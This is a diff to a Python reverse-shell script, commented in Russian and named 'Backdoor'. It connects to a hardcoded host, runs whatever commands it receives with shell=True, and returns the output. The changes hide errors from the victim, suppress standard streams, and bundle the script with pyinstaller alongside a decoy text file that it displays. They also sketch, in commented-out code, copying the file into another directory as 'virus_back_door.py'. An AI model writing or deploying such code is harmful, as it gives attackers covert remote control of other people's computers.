@@ -3,15 +3,31 @@ import subprocess
 import json
 import os
 import base64
+import sys
+import shutil
 
 class Backdoor:
     def __init__(self, ip, port):
+        # для переноса файла
+        # self.change_use_file()
         # 1 - семейство 2 - тип соедение
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # ip и порт
         self.connection.connect((ip, port))
     
-        # форматируем в  json
+    # переносим файл в дргую папку
+    # def change_use_file(self):
+    #     file_name_dir = "/home"
+    #     evil_file = file_name_dir + "\\virus_back_door.py"
+    #     if not os.path.exists(evil_file):
+    #         # для exe файлов
+    #         # shutil.copyfile(sys.executable, evil_file)
+    #         # subprocess.call('mv ' + evil_file)
+    #         # для того чтобы запусить файл .py
+    #         shutil.copyfile(__file__, evil_file)
+        
+    
+    # форматируем в  json
     def res_send(self, data):
         js = json.dumps(data)
         self.connection.send(js.encode())
@@ -34,7 +50,9 @@ class Backdoor:
     
     # созд фун для приема команды и вывода в наш терминал
     def sys_com(self, command):
-        return subprocess.check_output(command, shell=True)
+        # отправка потоков в никуда
+        DEVNULL = open(os.devnull, 'wb')
+        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
     
     # для смены dir
     def change_dir(self, path):
@@ -62,7 +80,7 @@ class Backdoor:
                 # закрытие
                 if com == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif com[0] == "cd" and len(com) > 1:
                     command_result = self.change_dir(com[1])
                     # print(command_result)
@@ -76,5 +94,14 @@ class Backdoor:
                 command_result = "Man, you fucker"
             self.res_send(command_result)
         
-my_back = Backdoor("172.18.0.2", 810)
-my_back.run()
+# открываем файл с командой pyinstaller --add-data "/home/test.txt;." --onefile virus_back_door.py 
+# открываем файл с командой pyinstaller --add-data "test.txt:." --onefile virus_back_door.py
+file_n = sys._MEIPASS + "test.txt"
+subprocess.call("cat " + file_n, shell=True)
+
+try:
+    my_back = Backdoor("172.18.0.3", 810)
+    my_back.run()
+# пользователю не будут показывать ошибки
+except Exception:
+    sys.exit()
